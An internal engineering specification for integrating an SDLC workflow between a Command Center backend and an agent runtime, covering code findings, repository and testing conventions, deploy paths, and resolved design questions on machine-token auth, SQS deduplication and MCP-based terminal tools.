`platform-tools.ts:87`/`:130`/`:176` with `isAutoApprovedCommand` short-circuiting runCommand at `:174`; `runCommand`'s 120 000 ms cap at `node-platform-adapter.ts:186`; `askQuestion` metadata `{timeoutMs: 0, timeoutExempt: true}` at `tool-metadata.ts:24`; `ToolContext` at `tool-context.ts:38-59` carrying neither model id nor cumulative usage; `ToolDispatcher.execute` `:59-102` and the rejection path `:130-137`; `prompt-loader.ts:12` single-entry module cache (with a 5-minute TTL at `:4` the doc omits); global-only `autoApproveFileChanges`/`autoApproveAllCommands` (`protocol/src/settings.ts:24-32`, `core/src/settings.ts:27-29`) with zero references outside `settings.ts`; `pruneWorktrees` at `git-worktree.ts:222`; **no** `git commit` or `git push` primitive anywhere in `packages/core/src` (the only commit-creating code is `git-isolate.ts:228-244` using plumbing `commit-tree` to snapshot dirty state, advancing no branch; the only `'push'` string is `git stash push` at `resume-guard.ts:717`); **zero** SQS references in either `sherpa-sdk` or `nevado-sherpa-tui`; **zero** case-insensitive `sdlc` references in either. Live AWS (`testing-tooling`, 946774551778): ALB `testing-sherpa-alb` at `testing-sherpa-alb-1426385821.us-east-1.elb.amazonaws.com`, `internet-facing`, `active`; instance `i-0d5271e1ce5ea4fb0` named `testing-sherpa-runtime` at `10.16.2.183` in `vpc-02482e2c1d40e003b`; exactly two user-pool clients (`testing-sherpa-alb-client` `2915ehrg9e32bd3cgmr6hl3vrm`, `testing-control-center-client` `c2tgqkjuuegr13rbqjfc2tb7e`) and **no** `client_credentials` client; ALB rules 10 (`/v1/workspace/auth`) and 20 (`/v1/workspace/*`) plus a default action of `authenticate-cognito` with `OnUnauthenticatedRequest: authenticate` — so the architecture doc's "rule 6 is not decoration" argument is correct and verified live.

#### 0.1.d Found during the review cycle — three that change an instruction

Numbered because §0.5 and several tasks reference them.

**(1) The terminal-tool schemas put Command Center's plan and QA vocabulary inside the runtime, with a recurring bill.** ⚠ **Revision 3 supersedes both the framing and the fix recorded here — read §0.6 first.** The diagnosis below is right about the cost; it is wrong to lead with the boundary (§A.5.0 has the durable rationale), and revision 2's fix over-corrected by collapsing the tool *names*. Kept for the history, because someone will find the collapse in the git log and wonder why it was reversed. As originally specified, `PlanCompletion` carried CC's `expandedRequirements` shape — `requirements[].{id,title,description,acceptanceCriteria[],complexity,category,dependencies?,files?}`, `filesToCreate`, `filesToModify`, `assumptions`, `risks`, `estimatedEffort`, `approach` — as a typed contract in `packages/protocol/src/sdlc.ts`, and `ReviewCompletion` carried CC's QA vocabulary (`verdict`, a four-level `severity`). Worse, the `inputSchema` for both lived in `sherpa-sdk/packages/core/src/tool-specs.ts`, because BQ3(a) establishes there is no injection seam. The architecture's defence — *"the union is a fact about tools, not about steps"* — does not hold when the tool is named `submitPlan` and its schema is CC's plan schema.

The cost was operational, not aesthetic: **every field ever added to either schema would have cost an SDK publish plus a manual SSM deploy that kills every in-flight human session.** You will iterate on a plan schema; everyone always does. §A.5.2 keeps both tool *names* and makes their `payload` field `unknown` — the runtime never types it and never reads it. The schema itself moves into `backend/common/sdlcContract.js` as data (§A.8a), read by three consumers: CC's `instructions`, the create request's `resultSchema` (§A.5.3), and the consumer's validator. **Revision 3 corrects revision 2 here**: collapsing the tool *names* was never required to fix this and it cost the stage discriminator — see §A.4.3.

**(2) `application` is already settable by a caller; only `createdBy` is genuinely forced.** The review concluded both invisibility keys are forced and that unforcing them is a prerequisite for the ACL. The forced block at `session-manager.ts:755-768` does hold `createdBy: this.userId` unconditionally at `:759` — but `application` arrives via a **conditional** spread at `:768`: `...(this.application ? { application: this.application } : {})`. The runtime's `SessionManager` is constructed **without** an `application` (`apps/runtime/src/index.ts:59-69` passes `store`, `userId`, `publish`, `agentId: 'web'`, `remoteList`, `settle` and nothing else), so `this.application` is `undefined`, the spread contributes `{}`, and `options.application` from the caller spread at `:749` survives.

**Consequence: v1's ACL needs no SDK change** (BQ4). The hazard this creates instead is that the behaviour is *incidental* — anyone who later passes an `application` to that constructor silently starts overriding `'sdlc'` and quietly disables the whole ACL. That is why BQ4 still unforces both fields in 4.0.2 and why Task 2.2 asserts the persisted value in a test.

**(3) The `progressLog`/`activities` truthiness bug has a second instance, in the backend, and it is unit-testable.** The review found it in `CycleProgress.jsx:75`. There is a mirror at `backend/lambda_handlers/agentDrivenOrchestrator/progressTracker.js:190`:

```js
activities: cycle.activities || cycle.progressLog || [],
```

Same defect, opposite direction. `activities` is **not** initialised on the cycle record (only `progressLog: []` is, `index.js:1096`), so the fallback works for a fresh cycle — but the moment the legacy engineering agent writes one `activities` entry, this line stops consulting `progressLog` and the orchestrator's own progress is dropped from whatever consumes `progressTracker`'s output.

**And there are three writers, not two.** `progressLogger.js:43` writes `progressLog`; `engineeringAgent/orchestratorHandler.js:102` **and** `progressTracker.js:55` both write `activities`. Task 0.5's `selectActivities` is shared by both call sites for exactly this reason: one selector, one behaviour, one test suite.

### 0.2 Repo conventions you must follow

Read this before writing a line. Every new file names the exemplar to copy.

#### Test runner and layout

| | |
|---|---|
| Backend unit tests | `jest` (v30), run from `backend/`. Config `backend/jest.config.js`; global AWS-SDK mocks in `backend/jest.setup.js`. `testMatch` is `**/__tests__/**/*.test.js` and `**/?(*.)+(spec\|test).js`. Module alias `^common/(.*)$ → <rootDir>/common/$1`. |
| Command | `npm run test:backend` from the repo root, or `npm test` from `backend/`. Single file: `cd backend && npx jest __tests__/foo.test.js`. |
| Location | **`backend/__tests__/<subject>.test.js`**, flat, one file per subject. 31 files exist. There are no nested `__tests__` directories except `backend/lambda_handlers/preTokenGeneration/index.test.js`. Put new tests in `backend/__tests__/`. |
| **Frontend unit tests** | **There is no frontend test runner.** `frontend/package.json` has no `test` script and no vitest/jest in `devDependencies`. There are zero `*.test.*`/`*.spec.*` files under `frontend/src`. |
| Frontend verification | Three real mechanisms, in order of cost: (1) `npm run lint:frontend` (eslint); (2) a **source-parsing guard test in `backend/__tests__/`** — the established pattern, see below; (3) Playwright (`npm test` at the root → `npx playwright test`, specs in `tests/flows/`). |
| Integration tests | `npm run test:integration` → `jest.integration.config.js`, `tests/integration/**/*.test.js`, `maxWorkers: 1`, 60 s timeout, hits a deployed environment with credentials from `.env.local`. Out of scope for Phases 0–3 except where noted. |

**The source-parsing guard test is a first-class convention here, not a hack.** Use it whenever the two sides of a contract cannot be imported into one process. Exemplars, in order of how close they are to what you will need:

- `backend/__tests__/cycleActionWiring.test.js` (74 lines) — reads `cycleStatusConfig.js` and `AttentionCard.jsx` as text, extracts identifiers with regex, asserts they reconcile. Its first test ("finds actions in both files") exists **so the suite cannot vacuously pass if a regex stops matching**. Copy that guard; without it a refactor silently disables the test.
- `backend/__tests__/frontendContractGuard.test.js` (169 lines) — reconciles `frontend/src/services/apiService.js` against `route_key` strings in `infrastructure/*.tf`, with an explicit `KNOWN_GAPS` allowlist and a "no stale KNOWN_GAPS" test that forces the allowlist to shrink.
- `backend/__tests__/runtimeDispatch.test.js:104-132` — the `describe('orchestrator wiring')` block reads `agentDrivenOrchestrator/index.js` as a string because the module "is not directly requireable in tests (pulls in client-lambda etc)". Use this when you need to assert a wiring fact in `index.js`.
- `backend/__tests__/sherpaSdkDriftGuard.test.js` (68 lines) — pins `@nevadoai/sherpa-protocol`'s version from `package-lock.json` against a `PINNED_SDK_VERSION` constant, with a header that is explicit about what the guard does **not** cover. This is the model for pinning any value ported from the SDK.

**When index.js *is* requireable:** `backend/__tests__/applyRuntimeEffect.test.js` (115 lines) shows how — `jest.isolateModules`, `DynamoDBDocumentClient.from` replaced with a `{send}` stub, `jest.spyOn` on `common/dynamoHelpers.updateItem` and `common/progressLogger.addProgressLog`, and a `trackCommandArgs()` helper that recovers command payloads from the auto-mocked constructors' `mock.calls` because auto-mocked SDK command instances carry no `.input`. **Copy this file wholesale as the harness for the consumer Lambda's tests.** Do not try to rebuild it.

#### Test style

Tests are named as sentences that state the behaviour and, where relevant, the failure they prevent — `it('reports a commit-less completion as failure, not silent success')`, `it('handles every action a status declares')`. Comments inside tests explain *why the assertion matters*, not what it does. File headers are multi-paragraph and explain what the suite guards and what it deliberately does not. Match this; it is consistent across all 31 files and is the reason the suite is readable.

#### Lambda handler shape

Exemplar for a **new SQS-consumer Lambda**: `backend/lambda_handlers/devopsDiagnosisEngine/index.js`.

```js
// devopsDiagnosisEngine/index.js:58-71 — the shape to copy
exports.handler = async (event, context) => {
  const batchItemFailures = [];
  for (const record of event.Records) {
    try {
      await processRecord(record, context);
    } catch (err) {
      console.error('[DiagnosticEngine] Transient error processing record:', err);
      batchItemFailures.push({ itemIdentifier: record.messageId });
    }
  }
  return { batchItemFailures };
};
```

Conventions it establishes, all of which the new consumer must follow:

- Clients are constructed **once at module scope** (`:30-33`), `TABLE_NAME` read from `process.env.DYNAMODB_TABLE_NAME` at module scope (`:34`).
- `require('common/dynamoHelpers')` — the **bare `common/` form**, not a relative path. See packaging below.
- Every log line is prefixed `[ComponentName]`. `console.log` / `console.warn` / `console.error`; there is no logging library.
- Per-record try/catch, failures reported individually, the batch never throws.

#### The `Queries.*` pattern

`backend/common/dynamoHelpers.js` (1860 lines) exports both a legacy closure-style API (`putItem`, `getItem`, `updateItem`, `queryByPK`, `queryByGSI`, … `:293-453`, which read `TABLE_NAME` from their own module scope) and a newer `Queries` namespace whose functions take the client and table name explicitly:

```js
const { Queries, getItem, updateItem } = require('common/dynamoHelpers');
await Queries.acquireDiagnosisLock(ddbClient, TABLE_NAME, lockScope, type);   // devopsDiagnosisEngine/index.js:80
```

**Rule for new code: any query function you add goes in `Queries` and takes `(client, tableName, …)` as its first two arguments.** The handler owns client creation. Do not add to the legacy closure API.

#### Packaging — how a new handler directory reaches Lambda

`scripts/deployment/package-lambdas.sh`. Two things a new handler needs:

1. **A `maybe_package` line.** Handlers are registered explicitly, one line each, at `:444-468`:
   ```sh
   maybe_package "agentDrivenOrchestrator" "backend/lambda_handlers/agentDrivenOrchestrator"
   ```
   `maybe_package` (`:386-397`) skips a handler whose source directory is unchanged and whose zip already exists, otherwise calls `package_lambda_with_common` in parallel.
2. **Awareness of what `package_lambda_with_common` (`:128-`) actually copies.** It copies **only `.js` files directly in the handler directory** — no subdirectories — and then rewrites `require('../../common/…')` to `require('common/…')` with `sed` (`:143-149`) so the requires resolve through the shared Lambda Layer. `common/` is **not** copied into the zip (`:151`); it is served from `nodejs/node_modules/common/` in `aws_lambda_layer_version.common_layer`, built by `package_common_layer` (`:312-336`).

   **Consequences you will hit:** (a) write requires as `require('../../common/x')` in source so the sed finds them; (b) do not put handler code in a subdirectory unless you also add a copy step; (c) anything you add to `backend/common/` is installed into ~20 Lambdas, so its dependency cost is shared — this is exactly why `backend/common/sherpaSessions.js` is a hand-port rather than an SDK dependency (`sherpaSessions.js:21-27`), and why you must not add `@nevadoai/*` to `backend/common/package.json`.

#### HTTP client idiom

Node 20 global `fetch`. **No axios in the SDLC path** (axios exists only under `lambda_handlers/selfHealingAgent/`). The exemplar for an authenticated outbound client with a cached credential is `backend/lambda_handlers/cursorAgent/cursorClient.js`:

- Module-scope credential cache with an explicit TTL (`:18-20`), refreshed through Secrets Manager with an env-var fallback (`:25-57`).
- One `xxxRequest(method, endpoint, body)` wrapper (`:62-90`) that sets `Authorization: Bearer`, checks `!response.ok`, reads `response.text()` for the error body, logs it, and **throws with status and body included** (`:83-87`).

Copy this shape for `createRuntimeSession`. Note `@aws-sdk/client-secrets-manager` is **not** in `backend/lambda_handlers/agentDrivenOrchestrator/package.json` — adding it is part of Phase 2 Task 2.6.

#### Error handling and logging

- Prefix every log with `[Component]`.
- `ConditionalCheckFailedException` is caught by name and treated as a semantic outcome, never rethrown blindly. Canonical examples: `progressLogger.js:52-55` (cycle gone → return `null`), `index.js:205-211` (cycle cancelled → `return`), `index.js:1318+` (plan write lost the race).
- API responses go through `buildResponse(statusCode, body, headers, event)` — `backend/common/responseHelpers.js:15-29` for the shared helper, and a local `buildResponse` at `index.js:2604` inside the orchestrator.
- Never swallow. `reportProgress` (`orchestratorHandler.js:114-116`) `console.warn`s and continues **deliberately**, because failing to log progress must not fail the work; that is the only sanctioned form of swallowing and it is commented.

#### Runtime-side conventions (`nevado-sherpa-tui/apps/runtime`)

Different repo, different idioms. Do not carry Command Center's conventions across.

| | |
|---|---|
| Framework | **Fastify 5**, not Express. `app.register(cors, {origin: true})` and `@fastify/websocket` at `apps/runtime/src/index.ts:31-34`. No helmet, no rate limit, no schema-validation plugin. |
| Routing | **One prefix encapsulation.** `app.register(async function workspaceRoutes(instance) {…}, {prefix: API_PREFIX})` at `index.ts:112-121`, where `API_PREFIX = '/v1/workspace'` (`config.ts:1`). Every `registerXRoutes(instance, …)` declares **bare** paths (`'/sessions'`, `'/settings'`, `'/ws'`) and the prefix stamps them. `GET /health` is registered on the **root** instance (`index.ts:102-110`), so it is `/health`, **not** `/v1/workspace/health`. |
| **How to add `/v1/sdlc`** | A **second encapsulated plugin with its own prefix**, plus a new `apps/runtime/src/routes/sdlc.ts` exporting `registerSdlcRoutes(app, …)`. Add `SDLC_PREFIX = '/v1/sdlc'` to `config.ts` and register it immediately after `workspaceRoutes`. **Do not add routes inside `workspaceRoutes`** — they would get the `/v1/workspace` prefix. The encapsulation is also what makes a scoped ACL hook safe (§A.3). Note the existing `app.register(...)` for `workspaceRoutes` is **not awaited** (unlike the `cors`/`websocket` registers above); Fastify defers plugin boot to `listen()` so it works, but a new plugin should `await` for consistency. |
| Config | A flat POJO built once at module load (`index.ts:28`, `loadConfig()` in `config.ts`), passed by value. **Every new env var goes in both the `RuntimeConfig` interface and `loadConfig`**, and gets a case in `apps/runtime/src/config.test.ts` (27 lines — the file to copy when adding env vars). |
| Error envelope | `interface ErrorResponse { error: string }`, re-declared locally in each route file (`routes/sessions.ts:26-28`, `routes/approvals.ts:6-8`) — **not shared, not in the protocol package**. Success is `{ok: boolean, sessionId?, modelId?, name?}` (`sessions.ts:30-38`). Statuses in use: `200`, `201`, `400`, `403`, `404`, `409`, `500`. Two structured exceptions: `409` adds `conflict` via the shared `conflictResponse(diag)` helper (`sessions.ts:79-91`), and one `200` returns `{status:'unshared', tombstone}` (`:157`). |
| Validation style | **Shape before truthiness, and validate before side effects.** `sessions.ts:254-256` checks `typeof prompt !== 'string' \|\| !prompt` with a comment explaining that a bare truthiness check lets a number through to `.trim()`. `null` is coerced to `undefined` **once, at the boundary** (`:249`, `body.name ?? undefined`). `name` is validated by the shared `checkSessionName` from the protocol package (`:278`) and the route **never re-phrases** the message (`:276`, `:281`, `:549`) — it passes `check.message` through. Match all of this. |
| **No error handler** | There is **no `setErrorHandler` and no `setNotFoundHandler`.** A path matching no route gets Fastify's default `{message, error, statusCode}` shape — a different envelope, documented as a real client hazard at `nevado-sherpa-tui/docs/RUNTIME_API.md:143-152`. See §A.2.5. |
| Test runner | **Node's built-in `node:test` + `node:assert`.** No Jest, no Vitest. `apps/runtime/package.json`: `"test": "find dist -name '*.test.js' -not -name '*.integration.test.js' -exec node --test {} +"`. Orchestrated by turbo (`turbo.json:17-26`, `dependsOn: ["build"]`). |
| **Tests run against `dist/`, not `src/`** | A `.test.ts` that was not compiled runs nothing **and still exits 0**. Always `pnpm build` first. `pnpm --filter @nevado/runtime test` on a stale `dist` is a silent no-op — this is the single most likely way to think a test passes when it never ran. |
| Test tiering | By **filename**. `*.integration.test.ts` is excluded from `test` and runs only under `test:integration` (they boot a real Fastify app or a real store). CI runs both, after `pnpm lint` and `pnpm typecheck` (`.github/workflows/pr-checks.yml:55-62`). |
| Test layout | Co-located, `src/**/*.test.ts` beside the module. 9 files today. |
| Route-test exemplar | **`apps/runtime/src/routes/sessions.test.ts`** (1506 lines — the big one, start here). Pattern: a local `makeApp(mgr, opts)` (`:109-124`) builds a bare `Fastify()`, calls `app.decorateRequest('userId', 'dev-user')` as the stand-in for the auth hook, registers the routes **without a prefix** (the prefix lives in `index.ts`, so `url: '/sessions'` is correct in tests), and drives it with `app.inject({method, url, payload})` (`:163-170`). |
| Shared doubles | **`apps/runtime/src/routes/test-fixtures.ts`** (167 lines): `mockConfig` (`:98`), `createMockWorker(overrides)` (`:157-167`), `createMockWorkspaceManager(baseDir)` (`:124-146` — and it deliberately reproduces the real containment throw at `:130-132`), `InMemoryObjectStore` (`:40-96`), `publishedTranscript()` (`:112-116`). **Reuse these.** The file's own comments (`:13-17`, `:151-156`) explain that per-suite doubles drifted and caused silent coverage gaps. |
| Unit-test exemplars | `apps/runtime/src/agent/workspace.test.ts` (69 lines, clearest), `apps/runtime/src/config.test.ts` (27 lines). Integration exemplar: `apps/runtime/src/routes/session-rename.integration.test.ts` (222 lines). |
| Logging | `Fastify({logger: true})` for request logs; `console.log`/`console.error` with a `[${session.id}]` prefix for session-scoped lines (e.g. `sessions.ts:344`). |
| SDK dependency | **Published tarball from `npm.pkg.github.com`**, not a workspace link: `"@nevadoai/sherpa-core": "^4.0.1"` and `"@nevadoai/sherpa-protocol": "^4.0.1"` (`apps/runtime/package.json:21-22`). The only `workspace:*` dep is `@nevado/tui`. The published tarball ships `src/` alongside `dist/`, so SDK source is readable under `node_modules/.pnpm/@nevadoai+sherpa-core@4.0.1/node_modules/@nevadoai/sherpa-core/src/` — **use that when you need the version that is actually deployed** (§0.1.b C29). |
| **Running git or `gh` as `ec2-user` over SSM** | **You must set `HOME=/home/ec2-user` explicitly.** The credential helper lives at the **XDG** path `/home/ec2-user/.config/git/config` (`infrastructure/sherpa-ec2-cloud-init.sh.tftpl:63-68`), **not** `~/.gitconfig`, so it resolves only when `HOME` points there. SSM RunCommand runs as `root` with `HOME=/root` by default, where the helper is invisible and git falls back to no credential — which looks exactly like an auth failure. Two probe attempts were lost to this. Prefix any such command with `sudo -u ec2-user HOME=/home/ec2-user …`. Note also that the token file `~/.config/gh/hosts.yml` (`github-token-manager.ts:8-9`) resolves through `os.homedir()` in the **service** process, so it is `ec2-user`'s copy — a root shell reads a different path. |
| **Wire contract doc** | `nevado-sherpa-tui/docs/RUNTIME_API.md` is accurate and worth reading before touching a route. `nevado-sherpa-tui/docs/AWS_DEPLOYMENT.md:553-681` is the deploy runbook. |

#### The Go rule, and where it is written down

**Only new and updated Lambdas are Go; an update means port-then-change.** §0.8.5 is the full statement. **This rule is written nowhere in the repo** — not `CLAUDE.md`, not `AGENTS.md`, not `docs/`, not the migration plan. It was transmitted verbally, and a constraint that strong which is discoverable only by being told will be violated by the next person. **Task 0.10 writes it into `CLAUDE.md`.** Until that lands, assume any contributor who has not been told will add a JS Lambda.

#### ⚠ `npm run lint` fails on clean `develop` — do not make it an acceptance check

Verified on `develop` at `be8fb4dc` with a clean tree: **`npm run lint:backend` exits 1 and `npm run lint:frontend` exits 2.** Both fail before any change in this spec is applied.

**So any acceptance check that says "`npm run lint:frontend` passes" is unsatisfiable**, and several tasks below said exactly that. The correct form, until a separate fix lands:

> **`npm run lint:frontend` produces no *new* findings** — capture the baseline on `develop` first (`npm run lint:frontend 2>&1 | tee /tmp/lint-base.txt`), then diff. Or lint only the touched files: `npx eslint frontend/src/components/CycleProgress.jsx`.

Fixing the repo-wide lint failure is **out of scope** and should be its own issue. Do not let it block a correct change, and do not "fix lint" opportunistically inside an SDLC task — that is how a one-line fix becomes an unreviewable diff.

#### Go vs JS

**Historically** Go (`backend/go/`, 31 handlers) owned the CRUD/API surface and JS (`backend/lambda_handlers/`, 54 handlers) owned orchestration — `agentDrivenOrchestrator`, `engineeringAgent`, `qaAgent`, `testResultPoller`, `stuckCycleDetector`, everything `devops*`. Many names now exist in **both** trees; it is a migration well under way, not a clean split.

> **⚠ That division no longer governs new work. §0.8.5 and §0.9 do: only new and updated Lambdas are Go, and an update means port-then-change.**
>
> An earlier revision of this table said *"Everything in Phases 0–3 is JS… do not open a Go file to add a feature,"* citing architecture doc decision 2. **That is wrong and it has already misled an implementer.** Decision 2 (*"TypeScript in the existing JS orchestrator rather than a new Go executor"*) was **overturned by the Go mandate** (§0.8). The correct reading of Phases 0–3:
>
> | Phase | Language |
> |---|---|
> | 0 | one deletion, one frontend fix, one Terraform change, one SDK fix, two docs — **no Go, and no new JS either** (§0.8.7) |
> | 1 | Terraform, `openssl`, and the runtime repo (TypeScript). **No Command Center Lambda code at all** |
> | 2 | **Go** — `internal/runtimeclient` (Task 2.6), `internal/orchestrator/instructions` (2.7); the rest is the runtime repo |
> | 3 | **Go** — the cycle worker, the contract package, the event mapper, the cycle-effect logic (§0.8.10) |
>
> **An implementer who followed §0.9 over this table was right to.** When two sections of this document disagree about language, §0.9 wins.

### 0.3 Deploy paths — read this or you will lose a day

Three facts, all verified, all load-bearing for Phases 1–3:

1. **`deploy-dev.yml` deploys *internal*, with a 426-entry `-target=` list.** `-var="customer=internal"` at `:351`, `:405`, `:589`. Three phased applies: "Terraform Apply: Core" (`:419`, targets from `:427`), "DevOps Phase 1" (`:645`), "DevOps Phase 2-4" (`:822`). A resource absent from the relevant list is written, reviewed, merged and **silently never deployed to internal**.
2. **`deploy-testing.yml` deploys *testing*, with no targets at all.** On every push to `develop` it runs `npm run test:backend` then dispatches `deploy-customer-instance.yml` with `customer_id=testing`, `account_id=946774551778`, `is_update=true`, `enable_sherpa_runtime=true`. That workflow does a full `terraform plan -out=tfplan` (`:1096`) and `terraform apply -auto-approve tfplan` (`:1131`) — **zero** `-target=` flags.
3. **Therefore the `-target=` rule is still mandatory and now harder to catch.** Phases 1–3 are validated in *testing*, where a full apply picks up new resources regardless. A forgotten `-target=` entry will not fail any exit criterion in this document — it will fail silently, later, on internal. Add the target in the same PR as the resource. Every task below that creates a `.tf` resource names the exact target lines to add, and the acceptance check includes grepping for them.

**⚠ Go had no pre-merge CI coverage at all, and that changes what "CI will catch it" means for every Go task in this spec.** Verified on `develop`:

| | |
|---|---|
| `pr-checks.yml` jobs | **`test`, `shell-lint`, `terraform-validate` — and nothing else.** No `setup-go`, no `go build`, no `go test`, no `go vet` |
| The only Go compile | `scripts/deployment/package-lambdas.sh:408` — `GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -tags lambda.norpc`, invoked from `deploy-dev.yml` and `deploy-customer-instance.yml`, i.e. **post-merge** |
| `go test` anywhere in CI | **nowhere** |

So before this work, **a Go change that did not compile merged cleanly and failed in the deploy**, and a Go test could be broken indefinitely without anyone knowing. **A Go job now exists in `pr-checks.yml`** as part of this project's first substantial Go work — and it is what makes §0.9.2's contract drift check actually gate a pull request rather than being a script nobody runs.

**Two consequences for how you read the rest of this document:**

- **Every "not TDD — verified by X" and every acceptance check on a Go task assumes that job exists.** If it is ever removed, those checks become advisory.
- **The drift check is load-bearing and pre-merge.** §0.9.2 requires regenerating the browser artifact and failing on a diff. Without a Go job in `pr-checks.yml` that check can only run post-merge, which is the same silent-drift posture that left `saveLearnedPattern` non-functional through two releases (§A.5.0a).

**Runtime server deploy:** `apps/runtime` is fetched by cloud-init from a mutable S3 pointer — `runtime/latest.txt` → `runtime/sha-$SHA.tar.gz` (documented at `backend/__tests__/sherpaSdkDriftGuard.test.js:17-21`). Deployment is an **SSM RunCommand a human runs manually**; there is no pipeline. This has two consequences you must design around:

- The runtime version deployed to testing **cannot be observed from `command-center`**. A runtime change and a CC change cannot be atomically released. This is why the envelope carries `v` (§A.4.1) and why §A.8's protocol changes are additive-only.
- Every phase from 1 onward has a runtime-side deploy step that is manual and must be scheduled with whoever owns the runtime. Phase 1 Task 1.6 is the first one; if it cannot be scheduled, Phases 1–3 stop. **This is the single largest schedule risk in Part 1** and it is not a technical one.

### 0.4 Blocking questions

Three. Each has a recommended default and the cost of guessing wrong. Do not silently pick one.

#### BQ1 — ~~Does a Cognito `client_credentials` access token pass the HTTP API JWT authorizer's `audience` check?~~ **RESOLVED: YES. Run against live testing on 2026-09-24.**

**Architecture doc U1 is closed.** The ten-minute probe in Task 1.2 was executed against the live `testing-tooling` account and passed. **Phase 1's ingress design (Option A) stands and nothing downstream is blocked on it.**

**Evidence, recorded in full because this was the single highest-risk assumption in the plan:**

| Step | Result |
|---|---|
| Baseline | Two user-pool clients; authorizer `asmmq1` audience `["c2tgqkjuuegr13rbqjfc2tb7e"]` — exactly as §0.1.c predicted. `commandcenter/cycles.write` present on the `commandcenter` resource server |
| Client minted | `m2m-sdlc-bq1-probe`, id `63qvsqrvj583ucnurp0nke4brc`, `client_credentials` only, `--generate-secret`, 60-minute access token |
| Audience updated | client id appended via `aws apigatewayv2 update-authorizer` |
| Token request | `POST https://testing-control-center.auth.us-east-1.amazoncognito.com/oauth2/token` → **`200`**, `expires_in: 3600` |
| Authorized call | `GET /v1/api-credentials` with that bearer → **`403`** with body `{"error":true,"message":"Admin access required to manage API credentials","timestamp":"…"}` |

**The `403` is the PASS, and the body is what proves it.** That is the *application's* error shape, not API Gateway's `{"message":"Forbidden"}` — so the JWT authorizer validated the token and invoked the integration. Task 1.2's decision tree called this correctly.

**Two caveats that must travel with this result.**

1. **The credmanager provisioning path is still unproven.** The audience entry was added **manually** with `update-authorizer`, not by `apiCredentialManager`. So `addToAudienceWithRetry` (`backend/go/internal/credmanager/authorizer.go:18-27`) remains unexercised end to end. **BQ1's answer is narrower than "M2M auth works":** it is *"the JWT authorizer accepts a `client_credentials` token whose client id is in the audience list."* Task 1.1's real provisioning route is still a first-run risk, and its second verification step (confirming the new client id landed in the audience) is therefore load-bearing rather than belt-and-braces.
2. **The probe invalidated this spec's prediction about the token's claim shape, and that defect is now Task 1.2b.** See below.

**What the token actually carries** — verbatim from the decoded payload, and the fixture every test in Task 1.2b must use:

```
auth_time
client_id : 63qvsqrvj583ucnurp0nke4brc
exp
iat
iss       : https://cognito-idp.us-east-1.amazonaws.com/us-east-1_hhB1fRqAZ
jti
scope     : commandcenter/cycles.write
sub       : 63qvsqrvj583ucnurp0nke4brc      <-- present, and EQUAL to client_id
token_use : access
version   : 2
```

**No `aud`** — the premise of BQ1, confirmed. But **`sub` is present and equals `client_id`**, and there is no `username` and no `cognito:groups`.

**This spec predicted "no `aud` claim and no `sub`". The `sub` half was wrong**, and it matters because **both of Command Center's machine-token classifiers test for `sub` being absent**, so neither can ever return `true` for a real machine token. §A.3's ACL and Task 1.7's negatives were both designed on a predicate that cannot fire. **Task 1.2b fixes it and is a hard prerequisite for Task 1.7 and for Phase 2 Task 2.4.**

#### BQ2 — ~~Where does the `seq` counter live, and is it durable?~~ **RESOLVED: there is no counter. Use a per-envelope UUID.**

Settled by the architecture review. Recorded here because the spec previously recommended a durable counter and someone will find that recommendation in the git history.

`MessageDeduplicationId` has exactly one job: **be identical for a retry of the same `SendMessage` and different for two different messages.** It does not need to be monotonic — ordering is `messageGroupId`'s job, and §A.4 is explicit that the consumer never reorders. So a UUID v4 minted once when the envelope is constructed, and reused across retries of that one call, satisfies the requirement completely.

A durable counter is strictly worse on both axes:

- **Its failure mode is silent and catastrophic.** A restart that loses the counter republishes a used id, and SQS **drops the message as a duplicate with no error anywhere**. A UUID that loses in-memory state produces a *new* id, which is delivered — a harmless duplicate the consumer is already idempotent against (§A.4.5, Task 3.4).
- **It puts a process-global lock on the publish hot path.** `FileSessionStore` serialises **whole-file** read-modify-write of `sessions.json` through a **single fixed mutex key** — *"One fixed key — the file is the resource"* (`file-session-store.ts:19-32`). Persisting a counter per published message means rewriting the entire session list, under that lock, on every event publish, for every concurrent session. No test in Task 3.9 would have surfaced that.

**Decision: `MessageDeduplicationId = <uuid v4, minted at envelope construction, reused on retry>`.** `seq` is retained in the envelope as an **explicitly non-durable, in-memory, per-session counter for log readability only**, with a comment saying it is not the dedup key. §A.4.1 and §A.4.5 are written against this; Phase 3's old exit criterion 5 (the restart test) is deleted along with architecture doc risk R5c, which no longer exists.

#### BQ3 — ~~Can the three terminal tools be injected by the runtime?~~ **RESOLVED: YES — through `McpToolProvider`. No SDK release, and no 4.0.2.**

**Revision 6 supersedes both halves of the earlier answer.** This question was answered "no, so publish 4.0.2"; the shipped answer is "yes, through a seam the earlier audit did not follow", and that is what removed the SDK from the critical path entirely.

**(a) There IS an injection seam, and it is `McpToolProvider`.** The earlier audit's negative findings all hold as far as they go — `getToolConfig` is not imported in `apps/runtime`; `buildToolConfig` is subtractive only, with no allowlist parameter; `AgentEngineOptions` and `AgentRunnerDeps` have no tools field; dispatch is a hardcoded `switch` whose default arm calls `executePlatformTool`, itself a second closed `switch`. **What it got wrong was dismissing MCP.**

The dismissal was: "its tools are reached through the `listMcpTools`/`useMcpTool` meta-tools and never appear to the model as named tools with their own schemas." Both clauses are true. **Neither is disqualifying**, and the reason is the one property that matters:

> The model calls `useMcpTool({toolName: 'submitPlan', input: {…}})`, and the engine forwards that as `executeTool('submitPlan', {…})`. **The tool name survives the proxy**, so it remains the `kind` discriminator §A.5.2 depends on.

So the three terminal tools ship **in the runtime** — `apps/runtime/src/sdlc/terminal-tools.ts`, one `McpToolProvider` per session — against the **unchanged, already-deployed `@nevadoai/sherpa-core@4.0.1`**. Nothing is published and nothing is bumped.

**What the seam buys, beyond skipping a release.** It gives **exact per-role separation for free, in code rather than configuration**: the provider's `listTools()` advertises **exactly one** tool — the session's own — and `executeTool` refuses every other name with a `toolError`. That is stricter than §A.7.3's allowlist, and it has to be, because 4.0.1's `buildToolConfig` is subtractive over fixed conditions with **no allowlist parameter**, so the allowlist as earlier specified is not expressible there at all (§A.5.4, §A.7.3).

**What it costs, and all three are worth knowing before changing anything:**

1. **The model never sees an `inputSchema`.** `listMcpTools` renders only `- **name**: description`, so the tool **descriptions are the only machine-readable statement of the calling convention** and are long on purpose. Command Center's `instructions` must state the payload shape as well; between them they are the whole contract.
